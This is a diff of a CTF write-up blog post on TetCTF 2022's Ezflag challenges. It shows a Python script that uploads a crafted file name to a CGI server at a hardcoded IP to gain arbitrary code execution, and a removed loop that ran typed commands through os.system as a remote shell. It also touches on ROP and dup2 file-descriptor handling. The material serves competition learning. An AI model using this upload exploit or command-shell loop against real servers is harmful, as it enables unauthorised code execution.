@@ -9,7 +9,7 @@ author: Darin Mao
 Ezflag was a two-part series from TetCTF 2022. The second involved a pretty basic ROP, but in a rather uncommon environment.
 
 # Ezflag level 1
-I was AFK while people were solving this. Essentially, it's a web server running CGI, and uploading a file named `wtmoo.p./y` gives arbitrary Python execution. My teammate gave me a handy script that behaves like a shell.
+I was AFK while people were solving this, so I'm not familiar with the details. Essentially, it's a web server running CGI, and uploading a file named `wtmoo.p./y` gives arbitrary Python execution. My teammate gave me a handy script that behaves like a shell.
 
 ```python
 import requests
@@ -49,11 +49,6 @@ import requests
 def upload_file(x):
     r = requests.post("http://18.191.117.63:9090", auth=requests.auth.HTTPBasicAuth("admin", "admin"), files={"file": ("wtmoo.p./y", x)})
     return r
-
-while False:
-    x = input("> ")
-    r = upload_file(f"import os; os.system({x!r})")
-    print(r.text)
 
 r = upload_file(open("wtmoo.py", "rb"))
 print(r.text)
@@ -248,14 +243,11 @@ This gadget does exactly what we need! As long as we can set `rax` to some `pop;
 
 Now, let's fix our file descriptors. The syscall we need is `dup2`.
 
-```
-int dup2(int oldfd, int newfd)
-
-dup2()
-    The dup2() system call performs the same task as dup(), but instead of using the lowest-num‐
-    bered unused file descriptor, it uses the file descriptor number specified in newfd.  If the
-    file descriptor newfd was previously open, it is silently closed before being reused.
-```
+> The `dup()` system call creates a copy of the file descriptor `oldfd`, using the lowest-numbered unused file descriptor for the new descriptor.
+>
+> After a successful return, the old and new file descriptors may be used interchangeably.
+>
+> `dup2()`: The `dup2()` system call performs the same task as `dup()`, but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in `newfd`. If the file descriptor `newfd` was previously open, it is silently closed before being reused.
 
 So what we're going to need is basically
 
